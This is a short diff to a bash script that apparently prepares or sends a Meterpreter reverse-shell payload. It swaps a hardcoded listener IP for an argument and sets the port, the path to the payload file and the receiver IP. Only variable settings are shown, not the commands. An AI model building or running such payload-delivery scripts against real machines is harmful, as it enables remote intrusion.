@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # Variables
-LHOST="192.168.0.222"  # Sender IP
+LHOST="$1"  # Sender IP
 LPORT="4444"           # Listener Port for msfvenom
 FILE_PATH="/home/kali/Documents/meterpreter_reverse_x64.elf"
 RECEIVER_IP="192.168.0.28"  # Receiver IP
